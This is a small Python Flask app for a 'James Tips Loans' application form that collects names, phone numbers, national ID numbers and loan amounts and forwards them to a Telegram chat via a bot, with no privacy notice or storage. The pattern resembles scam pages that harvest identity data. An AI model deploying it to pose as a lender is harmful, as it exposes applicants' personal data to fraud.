import os
from flask import Flask, request, render_template_string
import telebot
from threading import Thread

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

print(f"DEBUG: BOT_TOKEN loaded? {'YES' if BOT_TOKEN else 'NO'}")
print(f"DEBUG: CHAT_ID loaded? {'YES' if CHAT_ID else 'NO'}")

app = Flask(__name__)

if BOT_TOKEN:
    bot = telebot.TeleBot(BOT_TOKEN)
else:
    bot = None
    print("ERROR: BOT_TOKEN not set in Render Environment!")

FORM = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:sans-serif;background:#f4f6f9;padding:20px}
.card{max-width:420px;margin:30px auto;background:white;padding:25px;border-radius:12px}
input,select{width:100%;padding:13px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:14px;background:#0a7a44;color:white;border:none;border-radius:8px;font-weight:bold}
</style></head><body>
<div class="card">
<h2>James Tips Loans</h2>
<form method="POST">
<input name="name" placeholder="Full Name" required>
<input name="phone" placeholder="Phone Number" required>
<input name="id" placeholder="ID Number" required>
<input name="amount" type="number" placeholder="Loan Amount KES" required>
<select name="duration" required>
<option value="">Duration</option><option>1 Month</option><option>3 Months</option><option>6 Months</option><option>12 Months</option>
</select>
<button>Submit Application</button>
</form></div></body></html>
"""

@app.route("/apply", methods=["GET","POST"])
def apply():
    if request.method == "POST":
        text = f"NEW LOAN\\nName: {request.form.get('name')}\\nPhone: {request.form.get('phone')}\\nID: {request.form.get('id')}\\nAmount: {request.form.get('amount')}\\nDuration: {request.form.get('duration')}"
        if bot and CHAT_ID:
            try: bot.send_message(CHAT_ID, text)
            except Exception as e: print(e)
        return "<h3 style='text-align:center;margin-top:60px'>Received! We will contact you.</h3>"
    return render_template_string(FORM)

@app.route("/")
def home():
    return "Live - Go to /apply"

if bot:
    @bot.message_handler(commands=['start'])
    def start(m):
        bot.reply_to(m, "Bot online. Form at /apply")

    def run_bot():
        bot.infinity_polling()

    Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)